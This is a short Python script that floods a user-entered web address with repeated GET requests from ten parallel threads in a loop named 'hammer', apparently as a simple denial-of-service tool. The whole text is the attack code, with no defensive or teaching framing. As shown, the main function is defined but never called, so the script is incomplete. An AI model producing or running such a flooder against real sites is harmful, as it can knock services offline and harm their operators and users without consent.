import requests
import time
import threading

URL = "http://" + input("type web url \n example: example.com")
THREADS = 10
DELAY = 0.1

def hammer():
    while True:
        try:
            response = requests.get(URL)
            print(f"[{response.status_code}] {response.text[:50]}")
        except Exception as e:
            print(f"[!] Error: {e}")
        time.sleep(DELAY)

def main():
    for _ in range(THREADS):
        t = threading.Thread(target=hammer)
        t.daemon = True
        t.start()
    input("Press Enter to stop...\n")